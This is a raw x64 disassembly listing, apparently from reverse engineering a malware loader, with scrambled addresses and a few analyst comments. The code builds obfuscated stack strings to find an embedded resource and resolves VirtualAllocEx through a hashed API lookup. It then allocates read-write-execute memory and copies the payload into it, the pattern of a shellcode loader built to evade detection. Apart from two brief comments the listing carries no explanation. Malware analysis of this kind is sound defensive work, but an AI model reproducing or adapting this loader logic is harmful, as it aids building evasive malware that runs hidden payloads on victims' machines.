loc_18003A5E1: mov     [rsp+8], rcx
loc_1800069B1: sub     rsp, 68h
loc_180020B86: mov     qword ptr [rsp+38h], 0
loc_180021FED: mov     byte ptr [rsp+24h], 59h
loc_18004D8E3: mov     byte ptr [rsp+25h], 30h
loc_18001BB4A: mov     byte ptr [rsp+26h], 44h
loc_18003A5C9: mov     byte ptr [rsp+27h], 34h
loc_1800188EC: mov     byte ptr [rsp+28h], 0
loc_18005B1A2: mov     byte ptr [rsp+2Ch], 4Dh
loc_180033F3D: mov     byte ptr [rsp+2Dh], 34h
loc_180017E06: mov     byte ptr [rsp+2Eh], 53h
loc_18001B1EC: mov     byte ptr [rsp+2Fh], 54h
loc_1800170BD: mov     byte ptr [rsp+30h], 33h
loc_180035FEB: mov     byte ptr [rsp+31h], 52h
loc_18004610C: mov     byte ptr [rsp+32h], 0
loc_18006300F: mov     qword ptr [rsp+50h], 0
loc_18004A7F4: mov     qword ptr [rsp+40h], 0
loc_18004E95F: call    near ptr unk_18001D430
loc_18003D706: mov     [rsp+38h], rax
loc_18001D117: cmp     qword ptr [rsp+38h], 0
loc_1800320CA: jnz     near ptr unk_180048D85
loc_180035ECB: xor     eax, eax
loc_18002D653: jmp     near ptr unk_1800314ED
loc_1800314ED: add     rsp, 68h
loc_180034B5F: retn
loc_180048D85: lea     r8, [rsp+2Ch]
loc_180005F46: lea     rdx, [rsp+24h]
loc_180058DBC: mov     rcx, [rsp+38h]
loc_18005BC0E: call    near ptr unk_180010125
loc_18002E449: mov     [rsp+48h], rax
loc_18000D2B6: cmp     qword ptr [rsp+48h], 0
loc_180060BC9: jnz     near ptr unk_180002076
loc_18005EFFD: xor     eax, eax
loc_18002317E: jmp     loc_1800314ED
loc_180002076: mov     rdx, [rsp+48h]
loc_1800236E0: mov     rcx, [rsp+38h]
loc_18000B4E9: call    near ptr unk_180017DFA
loc_180040A7C: mov     [rsp+20h], eax
loc_180011E27: cmp     dword ptr [rsp+20h], 0
loc_18005CCAA: jz      near ptr unk_1800059B4
loc_1800125BB: cmp     dword ptr [rsp+20h], 0
loc_180042107: jnb     near ptr unk_18000D05E
loc_1800059B4: xor     eax, eax
loc_180019C22: jmp     loc_1800314ED
loc_18000D05E: mov     rdx, [rsp+48h]
loc_1800448BB: mov     rcx, [rsp+38h]
loc_180042723: call    near ptr unk_180003652
loc_18002C065: mov     [rsp+58h], rax
loc_180013A9A: cmp     qword ptr [rsp+58h], 0
loc_180059FFD: jnz     near ptr unk_1800496D3
loc_18005E3B6: xor     eax, eax
loc_180031ED4: jmp     loc_1800314ED
loc_1800496D3: mov     rcx, [rsp+58h]
loc_180052370: call    near ptr unk_18000AD10
loc_180028903: mov     [rsp+50h], rax
loc_180031395: cmp     qword ptr [rsp+50h], 0
loc_180024879: jz      near ptr unk_1800378A6
loc_180039681: mov     eax, [rsp+20h]
loc_18004BE67: mov     r9d, 40h
loc_1800454E6: mov     r8d, 1000h
loc_180050338: mov     edx, eax
loc_1800525CF: xor     ecx, ecx
loc_180003763: push    r15
loc_18000D467: push    r14
loc_180028CE3: xor     r14, r14
loc_1800353FC: mov     r15d, 0E553A458h ; VirtualAllocEx
loc_1800368EE: call    near ptr unk_180014D24 ; "execute" function (r15=winAPI function hash)
loc_18000CEE0: add     rsp, 20h
loc_180033E90: pop     r14
loc_180010643: pop     r15
loc_18006229D: mov     [rsp+40h], rax
loc_180041565: cmp     qword ptr [rsp+40h], 0
loc_180058168: jnz     near ptr unk_180013F22
loc_180036992: xor     eax, eax
loc_18003B1C3: jmp     loc_1800314ED
loc_180013F22: mov     eax, [rsp+20h]
loc_180014887: mov     r8d, eax
loc_1800567FC: mov     rdx, [rsp+50h]
loc_180002D01: mov     rcx, [rsp+40h]
loc_180044E4D: call    near ptr unk_180001923 ; memcpy
loc_180023D20: mov     rax, [rsp+70h]
loc_180034D53: mov     ecx, [rsp+20h]
loc_18006296F: mov     [rax], ecx
loc_1800378A6: mov     rax, [rsp+40h]